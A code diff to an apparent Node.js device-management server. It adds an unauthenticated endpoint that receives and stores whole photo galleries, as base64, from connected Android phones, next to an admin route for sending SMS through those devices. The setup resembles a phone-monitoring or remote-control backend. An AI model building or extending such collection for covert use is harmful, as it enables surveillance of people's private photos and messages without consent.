@@ -389,6 +389,41 @@ async function startServer() {
     }
   });
 
+  // Gallery photos sync endpoint — Android app sends gallery photos here
+  app.post('/api/devices/gallery', (req, res) => {
+    try {
+      const { device_id, photos } = req.body;
+      if (!device_id) return res.status(400).json({ error: 'device_id is required' });
+      if (!Array.isArray(photos)) return res.status(400).json({ error: 'photos must be an array' });
+
+      const insert = db.prepare(`INSERT OR REPLACE INTO gallery_photos
+        (device_id, media_id, filename, date_taken, width, height, size, image_base64, synced_at)
+        VALUES (?, ?, ?, ?, ?, ?, ?, ?, datetime('now'))`);
+
+      let count = 0;
+      for (const photo of photos) {
+        try {
+          insert.run(
+            device_id,
+            photo.media_id || 0,
+            photo.filename || '',
+            photo.date_taken || 0,
+            photo.width || 0,
+            photo.height || 0,
+            photo.size || 0,
+            photo.image_base64 || ''
+          );
+          count++;
+        } catch (_) { /* skip errors */ }
+      }
+
+      console.log(`[GALLERY] Synced ${count} photos from device ${device_id}`);
+      res.json({ success: true, synced: count });
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
+
   // Send SMS via device — admin sends command to a connected device
   app.post('/api/admin/send-sms', (req, res) => {
     try {
